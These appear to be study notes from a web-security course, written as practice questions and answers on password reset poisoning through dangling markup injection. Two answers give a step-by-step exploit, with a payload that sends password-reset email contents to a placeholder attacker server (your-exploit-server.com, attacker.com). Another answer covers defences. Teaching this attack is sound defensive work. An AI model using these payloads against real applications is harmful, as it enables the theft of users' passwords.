---
course: Web Security
topic: HTTP Host Header Attacks
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what dangling markup injection is and why it is significant in web security.**

Dangling markup injection is a type of HTML injection that exploits unenclosed tags or attributes. It occurs when user input is inserted into an HTML document without proper validation or sanitization, leading to the creation of incomplete or malformed HTML elements. This can be significant in web security because it can be used to bypass certain security measures, such as those designed to prevent Cross-Site Scripting (XSS). For example, if a web application escapes or encodes characters that are typically used in XSS attacks, dangling markup can still be exploited to inject malicious content.

**Q2. How would you exploit a password reset function using dangling markup injection to steal a user's password?**

To exploit a password reset function using dangling markup injection, follow these steps:

1. Identify the vulnerable parameter in the password reset functionality, often related to the host header.
2. Craft a payload that includes a dangling markup injection. For example, if the application inserts user input directly into an HTML anchor (`<a>`) tag, you could inject a payload like `'> <a href="http://your-exploit-server.com/?password=`.
3. Ensure that the payload is delivered in a way that the security service scanning the email will click on the link. This can be achieved by sending the crafted password reset request to the user's email.
4. Monitor the access logs on your exploit server to capture the query parameters, including the user's password, when the security service clicks the link.

Example payload:
```html
'> <a href="http://your-exploit-server.com/?password=
```

When the security service clicks the link, it will append the rest of the email content as a query parameter, revealing the user's password.

**Q3. Why is it important to understand how antivirus software interacts with email links when exploiting dangling markup injection?**

Understanding how antivirus software interacts with email links is crucial because many security services scan email links to determine if they are malicious. This behavior can be leveraged in dangling markup injection attacks to ensure that the injected link is clicked, even if the user does not interact with the email. By crafting the payload to be picked up by the security service, attackers can reliably execute their exploit and capture sensitive information, such as passwords, without requiring direct user interaction.

**Q4. How would you configure a web application to mitigate the risk of dangling markup injection attacks?**

To mitigate the risk of dangling markup injection attacks, you can implement the following configurations and practices:

1. **Input Validation and Sanitization**: Ensure that all user inputs are validated and sanitized before being included in HTML documents. Use libraries like DOMPurify to sanitize user inputs and prevent the insertion of untrusted HTML content.

2. **Content Security Policy (CSP)**: Implement a strict Content Security Policy to restrict the sources from which scripts can be loaded, thereby reducing the risk of script injection attacks.

3. **Output Encoding**: Encode user inputs appropriately when inserting them into HTML documents. For example, use HTML entity encoding to convert special characters into their corresponding entities.

4. **Regular Security Audits**: Conduct regular security audits and penetration testing to identify and fix vulnerabilities related to dangling markup injection and other types of injection attacks.

Example CSP configuration:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted-cdn.com;">
```

**Q5. Discuss recent real-world examples of dangling markup injection attacks and how they were exploited.**

One notable example of a dangling markup injection attack is the exploitation of a vulnerability in a web application that allowed attackers to inject malicious content into emails. In a specific case, attackers crafted a payload that included a dangling markup injection to bypass the application's security measures. When the security service scanned the email, it inadvertently executed the payload, leading to unauthorized access to sensitive data.

For instance, consider a scenario where an application generated a password reset email and included user input directly into the email body without proper sanitization. Attackers could inject a payload like `'> <a href="http://attacker.com/?password=`. When the security service clicked the link, it appended the rest of the email content, including the user's password, to the URL, allowing the attacker to capture the password.

By understanding and mitigating such vulnerabilities, organizations can better protect against dangling markup injection attacks and safeguard sensitive user data.

---
<!-- nav -->
[[04-Understanding Password Reset Poisoning via Dangling Markup|Understanding Password Reset Poisoning via Dangling Markup]] | [[Web Security (PortSwigger)/16-HTTP Host Header Attacks/08-Lab 7 Password reset poisoning via dangling markup/00-Overview|Overview]]
